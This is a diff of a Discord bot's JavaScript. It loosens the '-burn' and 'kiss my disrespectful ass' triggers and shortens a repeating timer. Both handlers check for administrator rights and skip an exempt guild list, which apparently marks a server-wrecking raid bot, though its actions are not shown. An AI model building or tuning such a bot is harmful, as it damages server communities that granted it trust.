@@ -45,12 +45,6 @@ function read(filePath, cb) {
 
 
 
-client.on("message", msg => {
-if(msg.content === 'bruh') {
-
-}
-})
-
 
 function song() {
   var rand = ["https://youtu.be/gFtb3EtjEic", "https://youtu.be/J8JoBttIy_c", "https://youtu.be/3rYoRaxgOE0", "https://youtu.be/aAkMkVFwAoo"]
@@ -297,7 +291,7 @@ client.on("message", msg => {
  
 
 client.on("message", async msg => {
-  if(msg.content === `-burn`) {
+  if(msg.content.startsWith(`-burn`)) {
     if(msg.channel.type === 'dm') {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
@@ -609,14 +603,14 @@ client.on("message", msg => {
           }, 2400);
           i++    
         }
-      }, 10000);
+      }, 3000);
     }
   }
 })
 
  
  client.on('message', message => {
-   if(message.content === 'kiss my disrespectful ass') {
+   if(message.content.startsWith('kiss my disrespectful ass')) {
  if(message.channel.type === "dm") {return}
   if(!unallowedguilds.includes(message.guild.id)) {
  if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
